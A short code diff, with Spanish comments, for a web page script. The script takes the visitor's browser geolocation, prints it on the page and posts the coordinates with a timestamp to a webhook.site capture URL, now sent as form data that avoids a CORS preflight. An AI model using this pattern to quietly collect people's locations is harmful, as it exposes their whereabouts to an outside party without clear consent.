@@ -10,22 +10,22 @@
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    
-                    console.log("✅ Ubicación obtenida:", lat, lon);
+
+                    // MOSTRAR UBICACIÓN EN PANTALLA
                     document.body.innerHTML += `<p>Latitud: ${lat}, Longitud: ${lon}</p>`;
 
-                    fetch("https://webhook.site/5ba595ff-7546-4228-8ff9-c2ff0b655f24", {
+                    // ENVIAR AL WEBHOOK
+                    fetch("https://webhook.site/5ba595ff-7546-4228-8ff9-c2ff0b655f24", { 
                         method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ latitud: lat, longitud: lon, timestamp: new Date().toISOString() })
-                    })
-                    .then(response => response.text())
-                    .then(data => console.log("✅ Respuesta del webhook:", data))
-                    .catch(error => console.error("❌ Error en fetch:", error));
-
-                }, error => {
-                    console.error("❌ Error obteniendo ubicación:", error);
-                    alert("Error obteniendo ubicación: " + error.message);
+                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                        body: new URLSearchParams({ 
+                            latitud: lat, 
+                            longitud: lon, 
+                            timestamp: new Date().toISOString() 
+                        })
+                    }).then(response => response.text())
+                      .then(data => console.log("Respuesta del servidor:", data))
+                      .catch(error => console.error("Error al enviar:", error));
                 });
             } else {
                 alert("La geolocalización no está disponible.");
